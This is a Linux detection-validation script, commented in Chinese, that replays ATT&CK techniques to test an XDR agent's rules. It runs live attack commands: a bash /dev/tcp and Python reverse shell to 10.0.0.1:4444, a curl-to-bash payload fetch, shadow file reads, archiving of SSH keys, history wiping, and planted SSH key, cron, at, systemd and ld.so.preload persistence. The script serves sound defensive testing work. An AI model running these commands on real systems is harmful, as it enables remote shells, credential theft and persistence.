#!/bin/bash
# OpenXDR Linux 实机回放（在 agent 所在 Linux 主机的本地文件系统上执行）
# 用法：bash validation/replay/linux.sh
# 注意：fanotify 在 9p/网络文件系统（如 WSL 的 /mnt/c）上不工作，必须在 ext4 等本地 fs 上跑；
#       WSL2 里 agent 按命名空间设计降级为轮询采集（短命进程 cmdline 可能为空），
#       进程类规则的实机命中验证需要真 Linux 机器。
mark() { echo "=== [$1] $(date +%T) ==="; }

mark 'T1082/T1033/T1087.001/T1003.008 发现与读取'
uname -a
whoami
cat /etc/passwd >/dev/null
cat /etc/shadow >/dev/null

mark 'T1059.004 bash /dev/tcp 反弹（3s 超时，连不上无害）'
timeout 3 bash -c 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'

mark 'T1059.006 python socket 反弹（5s 超时）'
timeout 5 python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4444))'

mark 'T1059.004 下载管道进 shell'
curl -s --connect-timeout 3 http://10.0.0.1/payload.sh | bash

mark '良性对照: sh -c echo hello（不应告警）'
sh -c 'echo hello'

mark 'T1560.001 打包收集'
mkdir -p /home/alice /opt/build/output /root/.ssh /home/user/.ssh
echo data > /home/alice/notes.txt
echo out > /opt/build/output/f.bin
echo dummy > /root/.ssh/id_rsa
tar czf /tmp/loot.tar.gz /home/alice
tar cvf /tmp/keys.tar /root/.ssh
tar czf /tmp/build.tar.gz /opt/build/output   # 良性对照（不应告警）
command -v zip >/dev/null 2>&1 && zip -r -q /tmp/etc.zip /etc || echo 'zip 未安装，跳过'

mark 'T1070.003 历史擦除'
bash -c 'history -c'
bash -c 'echo "" > ~/.bash_history'
bash -c 'unset HISTFILE'
ln -sf /dev/null /root/.bash_history

mark 'T1098.004 SSH 公钥持久化（文件视角 + 进程视角）'
echo 'ssh-rsa AAAAB3NzaC1yc2EAAAA attacker' >> /root/.ssh/authorized_keys
echo 'ssh-rsa AAAA' | tee -a /home/user/.ssh/authorized_keys >/dev/null

mark 'T1053.003 cron 落任务'
echo '* * * * * root /bin/evil' > /etc/cron.d/atomic-persist

mark 'T1574.006 ld.so.preload（空文件，随后删除，零风险）'
touch /etc/ld.so.preload
echo '# x' >> /etc/ld.so.preload

mark 'T1543.002 systemd 单元落盘/修改'
printf '[Service]\nExecStart=/bin/evil\n' > /etc/systemd/system/atomic.service
sleep 1
echo '# comment' >> /etc/systemd/system/atomic.service

mark '清理（删除事件也应上报）'
sleep 2
rm -f /etc/systemd/system/atomic.service /etc/cron.d/atomic-persist /etc/ld.so.preload
rm -f /root/.ssh/authorized_keys /home/user/.ssh/authorized_keys

mark '回放完成'

# ---- AB 档新采集项（2026-08-09 第二轮）----
# 注意：/var/spool/at 若不存在要先建目录并重启 agent（启动后新建的目录不会被补盯）；
#       kmodwatch 是 30s 快照 diff，模块要保持加载 35s 以上

mark 'T1053.001 at 任务文件'
mkdir -p /var/spool/at
echo '/bin/evil' > /var/spool/at/atomic.at
sleep 3
rm -f /var/spool/at/atomic.at

mark 'T1546.004 shell rc 追加'
echo 'alias ll="ls -la" # atomic-test' >> /root/.bashrc
sleep 2
sed -i '/atomic-test/d' /root/.bashrc

mark 'T1547.006 内核模块加载（保持 35s）/卸载'
modprobe dummy 2>/dev/null || echo 'modprobe dummy 不可用，跳过'
sleep 35
modprobe -r dummy 2>/dev/null
sleep 35

mark 'AB 档回放完成'
